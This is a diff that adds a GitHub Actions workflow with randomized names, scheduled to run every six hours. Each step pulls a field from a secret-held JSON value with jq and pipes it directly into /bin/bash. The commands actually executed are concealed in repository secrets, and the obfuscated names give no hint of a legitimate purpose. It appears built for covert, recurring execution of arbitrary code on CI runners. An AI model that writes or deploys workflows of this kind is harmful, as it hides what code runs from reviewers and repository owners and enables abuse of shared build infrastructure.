@@ -1,0 +1,25 @@
+name: drawingmisnomer
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: drawingmisnomer
+        env:
+          tyt36: ${{ secrets.tyt36 }}
+        run: |
+          echo $tyt36 | jq -r .rqrp70915 | /bin/bash
+          echo $dxtw18 | jq -r .txk7 | /bin/bash
+          echo $cfp950 | jq -r .fnme95712 | /bin/bash
+          echo $wzuo9 | jq -r .lmt1 | /bin/bash
+          echo $uojdl0 | jq -r .yfut1 | /bin/bash
+          echo $udksp3961 | jq -r .k977 | /bin/bash
+          echo $iqx019 | jq -r .c4 | /bin/bash
+          echo $bwje1429 | jq -r .gqhn42455 | /bin/bash
+
